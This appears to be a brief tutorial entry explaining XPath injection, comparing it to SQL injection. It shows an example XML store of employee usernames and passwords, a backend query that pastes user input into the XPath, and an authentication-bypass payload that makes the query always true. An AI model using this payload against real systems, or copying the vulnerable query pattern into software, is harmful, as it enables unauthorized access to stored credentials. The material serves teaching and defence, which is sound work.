# XPath Injection

When data is stored as XML, it can be queried using a string which is called the XPATH. XPath injection is a type of attack where user input is accepted as Xpath. A a malicious input can lead to un-authorised access or exposure of sensitive information such as the structure or content of XML document.

> Attacks are similar to SQL injection - SQLi attacks SQL data stores while XPathi attacks XML data stores.

Example:
```xml
<?xml version=”1.0" encoding="utf-8"?>
<Employees>
 <Employee ID="1">
    <Name>Sam</Name>
    <UserName>Johns</UserName>
    <Password>This is Secret</Password>
 </Employee>
 <Employee ID="2">
    <Name>Peter</Name>
    <UserName>Pan</UserName>
    <Password>Ssssshh</Password>
 </Employee>
</Employees>
```

Backend Query:
```
//Employee[UserName/text()='" & Request("UserName") & "' And Password/text()='" & Request("Password") & "']
```

Payload:
```
Username : test' or 1=1 or 'a'='a 
Password : test
```

This will make the backend query:
```
//Employee[UserName/text()=   '" & Request("UserName") & " '   And    Password/text()='" & Request("Password") & "']
//Employee[UserName/text()=   'test' or 1=1 or 'a'='a'        And    Password/text()='test']
```
